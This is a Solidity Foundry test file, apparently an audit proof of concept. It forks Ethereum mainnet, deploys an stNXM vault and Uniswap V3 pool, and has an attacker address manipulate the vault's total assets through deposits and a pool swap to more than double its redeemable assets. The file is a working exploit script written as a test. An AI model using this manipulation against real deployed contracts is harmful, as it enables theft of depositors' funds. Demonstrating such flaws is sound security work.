// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "forge-std/interfaces/IERC20.sol";

import "../../contracts/interfaces/INonfungiblePositionManager.sol";
import "../../contracts/interfaces/IUniswapFactory.sol";
import "../../contracts/interfaces/IWNXM.sol";
import "../../contracts/libraries/v3-core/IUniswapV3Pool.sol";
import "../../contracts/libraries/v3-core/ISwapRouter.sol";

import {StNXM} from "../../contracts/core/stNXM.sol";
import {StNxmOracle} from "../../contracts/core/stNxmOracle.sol";

contract TotalAssetsManipulationTest is Test {
    IWNXM internal wNxm =
        IWNXM(0x0d438F3b5175Bebc262bF23753C1E53d03432bDE);

    StNXM internal stNxm;
    StNxmOracle internal stNxmOracle;
    IUniswapV3Pool internal dex;

    ISwapRouter internal swapRouter =
        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address internal multisig =
        0x1f28eD9D4792a567DaD779235c2b766Ab84D8E33;

    address internal attacker = address(0xBAD);

    address internal uniswapFactory =
        0x1F98431c8aD98523631AE4a59f267346ea31F984;

    function setUp() public {
        string memory rpcUrl = vm.envString("INFURA_API");

        uint256 fork = vm.createFork(rpcUrl, 19_220_000);
        vm.selectFork(fork);

        stNxm = new StNXM();
        stNxm.initialize(multisig, 100_000 ether);

        IUniswapFactory(uniswapFactory).createPool(
            address(stNxm),
            address(wNxm),
            500
        );

        dex = IUniswapV3Pool(
            IUniswapFactory(uniswapFactory).getPool(
                address(stNxm),
                address(wNxm),
                500
            )
        );

        dex.initialize(79228162514264337593543950336);

        stNxmOracle = new StNxmOracle(
            address(dex),
            address(wNxm),
            address(stNxm)
        );

        deal(address(wNxm), address(stNxm), 2_000 ether);

        stNxm.initializeExternals(
            address(dex),
            address(stNxmOracle),
            1_000 ether
        );

        stNxm.transferOwnership(multisig);

        vm.prank(multisig);
        stNxm.receiveOwnership();

        deal(address(wNxm), attacker, 20_000 ether);
    }

    function test_Exploit_TotalAssetsManipulation() public {
        console2.log(
            "One stNXM before manipulation:",
            stNxm.convertToAssets(1 ether)
        );

        vm.startPrank(attacker);

        wNxm.approve(address(stNxm), type(uint256).max);
        wNxm.approve(address(swapRouter), type(uint256).max);
        stNxm.approve(address(swapRouter), type(uint256).max);

        uint256 initialDeposit = 100 ether;
        uint256 initialShares = stNxm.deposit(
            initialDeposit,
            attacker
        );

        uint256 manipulationCapital = 10_000 ether;
        uint256 sharesToSell = stNxm.deposit(
            manipulationCapital,
            attacker
        );

        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(stNxm),
                tokenOut: address(wNxm),
                fee: 500,
                recipient: attacker,
                deadline: block.timestamp,
                amountIn: sharesToSell,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        swapRouter.exactInputSingle(params);

        uint256 redeemableAssets =
            stNxm.convertToAssets(initialShares);

        console2.log(
            "One stNXM after manipulation:",
            stNxm.convertToAssets(1 ether)
        );

        console2.log(
            "Redeemable assets:",
            redeemableAssets
        );

        console2.log(
            "Profit:",
            redeemableAssets - initialDeposit
        );

        assertGt(
            redeemableAssets,
            initialDeposit * 2,
            "Share-price manipulation failed"
        );

        vm.stopPrank();
    }
}
